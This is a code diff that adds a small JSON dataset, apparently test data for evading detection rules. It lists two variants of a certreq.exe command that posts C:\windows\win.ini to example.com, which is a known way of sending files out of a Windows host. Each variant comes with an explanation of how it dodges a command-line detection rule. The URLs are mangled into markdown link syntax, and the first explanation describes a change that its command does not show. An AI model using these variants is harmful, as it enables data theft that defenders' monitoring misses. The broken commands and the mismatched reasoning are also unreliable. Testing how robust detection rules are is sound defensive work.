@@ -1,0 +1,10 @@
+[
+  {
+    "output": "certreq.exe -Post -config [http://example.com](http://example.com) C:\\windows\\win.ini",
+    "explanation": "The rule looks for exact spaces surrounding the parameters (' -Post ', ' -config ', and ' C:\\windows\\win.ini '). Removing the trailing space after the parameter argument or path breaks the specific string match while remaining valid syntax for the binary."
+  },
+  {
+    "output": "certreq.exe /Post /config [http://example.com/](http://example.com/) C:\\windows\\win.ini",
+    "explanation": "The rule expects dashes (' -Post ', ' -config ') to precede the parameters. Certreq.exe accepts forward slashes ('/Post', '/config') interchangeably on Windows systems, which satisfies the application's configuration requirements but satisfies none of the command line filters in the detection logic."
+  }
+]
